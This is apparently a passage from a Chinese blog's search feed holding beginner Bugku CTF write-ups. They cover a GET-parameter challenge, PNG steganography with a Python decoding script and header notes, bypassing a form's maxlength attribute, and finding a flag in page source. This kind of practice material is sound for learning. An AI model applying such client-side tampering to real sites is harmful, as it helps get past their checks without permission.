post只是一种传递数据的方式，get也可以把数据传到服务器，他们的本质都是发送请求和接收结果。只是组织格式和数据量上面有差别，GET和POST只是发送机制不同，并不是一个取一个发！</p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-web基础$_GET</title>
      <link href="/2019/01/19/201901/"/>
      <url>/2019/01/19/201901/</url>
      
        <content type="html"><![CDATA[<p><strong>web基础$_GET-writeup</strong><br><a id="more"></a><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjlc84t5j30dx0ajdg0.jpg" alt=""><br>点击访问链接，分析给出的代码<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjlgmwfoj30fc06wmx6.jpg" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what=$_GET[<span class="string">'what'</span>];  <span class="comment">//Get方式获取参数</span></span><br><span class="line"><span class="keyword">echo</span> $what;  </span><br><span class="line"><span class="keyword">if</span>($what==<span class="string">'flag'</span>) <span class="comment">//这里有个if判断当what的值等于flag时就输出flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br></pre></td></tr></table></figure></p><p>分析完代码，我们直接在URL中，后面直接加上?what=flag，Get请求<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>请求：从指定的资源请求数据。</span><br><span class="line">GET提交，请求的数据会附在<span class="keyword">URL</span>之后（就是把数据放置在HTTP协议头中），以?分割<span class="keyword">URL</span>和传输数据，多个参数用&amp;连接。</span><br><span class="line"><span class="keyword">URL</span>中的?号：分隔实际的<span class="keyword">URL</span>和参数</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjllbby0j30ps07hdfy.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-color</title>
      <link href="/2019/01/19/201903/"/>
      <url>/2019/01/19/201903/</url>
      
        <content type="html"><![CDATA[<p><strong>color-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjlx9sorj30dx0cuwep.jpg" alt=""><br>点击链接，得到一个压缩包附件，解压打开，7张png格式的图片，哇!你有见过彩虹吗？<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjm1b3evj30rx05a3yd.jpg" alt=""><br>利用Stegsolve查看每张图片的最低位，发现有变化，组合起来Make Me Tall<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjm68masj31ah0pzq69.jpg" alt=""><br>根据提示的意思，应该需要改变图片的高度<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjmaiaegj313s0ezmz8.jpg" alt=""><br>发现图片下方有黑白格子，按照黑格子-&gt;1,白格子-&gt;0，转成二进制<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjmg2z6rj30ox0admxi.jpg" alt=""><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111111010111101111</span></span><br><span class="line"><span class="number">11111011111110111111</span></span><br><span class="line"><span class="number">00001100101010110001</span></span><br><span class="line"><span class="number">01001010010000001101</span></span><br><span class="line"><span class="number">11010011011101010111</span></span><br><span class="line"><span class="number">10011011011010110110</span></span><br><span class="line"><span class="number">00111001101101111101</span></span><br></pre></td></tr></table></figure></p><p>经过几次尝试后发现，这里每一列(巨坑)，七个数字组成一个字符，进行二进制转化ascii码得到flag<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjmqzftkj311a0jzjtd.jpg" alt=""><br>python3脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># Bug_ku color</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 七张图片下方的黑白格子转换的二进制</span></span><br><span class="line">color1 = <span class="string">'11111111010111101111'</span></span><br><span class="line">color2 = <span class="string">'11111011111110111111'</span></span><br><span class="line">color3 = <span class="string">'00001100101010110001'</span></span><br><span class="line">color4 = <span class="string">'01001010010000001101'</span></span><br><span class="line">color5 = <span class="string">'11010011011101010111'</span></span><br><span class="line">color6 = <span class="string">'10011011011010110110'</span></span><br><span class="line">color7 = <span class="string">'00111001101101111101'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环根据下标组合成每一列的二进制</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">20</span>):</span><br><span class="line">    color = color1[i]+color2[i]+color3[i]+color4[i]+color5[i]+color6[i]+color7[i]</span><br><span class="line">    print(chr(int(color, <span class="number">2</span>)), end=<span class="string">''</span>)    <span class="comment"># 打印转换后的ASCII码</span></span><br></pre></td></tr></table></figure></p><p>PNG文件头知识：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（固定）八个字节：<span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A <span class="number">1</span>A <span class="number">0</span>A 代表着PNG文件头</span><br><span class="line">（固定）四个字节<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>D（即为十进制的<span class="number">13</span>）代表数据块的长度为<span class="number">13</span>，描述IHDR头部的大小</span><br><span class="line">（固定）四个字节<span class="number">49</span> <span class="number">48</span> <span class="number">44</span> <span class="number">52</span>（即为ASCII码的IHDR）是文件头数据块的标示（IDCH）</span><br><span class="line">（可变）紧接着<span class="number">13</span>位数据块（IHDR)</span><br><span class="line">-前四个字节代表该图片的宽（Width）</span><br><span class="line">-后四个字节代表该图片的高（Height）</span><br><span class="line">-后五个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjmxg6s6j312x0dijtf.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-计算器</title>
      <link href="/2019/01/19/201908/"/>
      <url>/2019/01/19/201908/</url>
      
        <content type="html"><![CDATA[<p><strong>计算器-writeup</strong><br><a id="more"></a><br>查看题目，访问题目给出的链接<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjn6t3osj30dt0ai3ym.jpg" alt=""><br>查看是一个随机数字运算的验证码，输入结果值发现最大只能输入一位长度的值<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjnb9egyj318l0iwaac.jpg" alt=""><br>点击提交看看有什么结果，并没有什么用！<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjnfx757j318m08j0t0.jpg" alt=""><br>浏览器上按F12,审核元素，查看源代码，发现maxlength=”1”,把maxlength=”1”修改为maxlength=”2”<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjnkgpjoj318o0f6myq.jpg" alt=""><br>把结果值填上，点击验证得到flag  </p><p>我发现一个骚姿势就是，只要你够耐心的话一直点击刷新，会有意向不到的结果<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjnplmqsj313t0aw0t6.jpg" alt=""><br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTML <span class="built_in">input</span> maxlength属性</span><br><span class="line">定义和用法  </span><br><span class="line">maxlength 属性规定 <span class="symbol">&lt;input&gt;</span> 元素中允许的最大字符数。  </span><br><span class="line">语法  </span><br><span class="line">&lt;<span class="built_in">input</span> maxlength=<span class="string">"number"</span>&gt;  </span><br><span class="line">属性值  </span><br><span class="line"><span class="keyword">number</span> 在<span class="symbol">&lt;input&gt;</span>元素中允许的最大字符串</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-web2</title>
      <link href="/2019/01/19/201902/"/>
      <url>/2019/01/19/201902/</url>
      
        <content type="html"><![CDATA[<p><strong>web2-writeup</strong><br><a id="more"></a><br>可能会写的有点啰嗦，但是我不想跟我一样入门的小白看到教程一脸？？？<br>这是一道20分值的简单题，听说聪明的人都能找到答案<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjo3vx4cj30dr0b10su.jpg" alt=""><br>直接访问链接<br>这是一个满屏滑稽的页面<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjo98sxkj318s0jundb.jpg" alt=""><br>在浏览器当前页面上直接按F12审查元素，查看源代码，查看到flag<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjoebd56j318g0j9k0r.jpg" alt=""><br>也可以利用view-source:sURL<br>查看源代码，查看到flag<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kjojpdwmj318w0jr3zm.jpg" alt=""><br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">F12:开发人员工具，是开发人员调试利器~  </span><br><span class="line"><span class="keyword">view</span>-<span class="keyword">source</span>:是一种协议，早在基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于windows pack2以及更高的版本后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器还可以使用。  </span><br><span class="line">使用方法： </span><br><span class="line"><span class="keyword">view</span>-<span class="keyword">source</span>:sURL  </span><br><span class="line">回车即可看到当前网页的源代码。</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勿忘初心</title>
      <link href="/2019/01/18/2019/"/>
      <url>/2019/01/18/2019/</url>
      
        <content type="html"><![CDATA[<p>努力努力再努力<br><a id="more"></a><br>Hello,Blog!</p>]]></content>
      
      
      <categories>
          
          <category> 勿忘初心 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 努力努力再努力 </tag>
            
            <tag> 小维同学 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
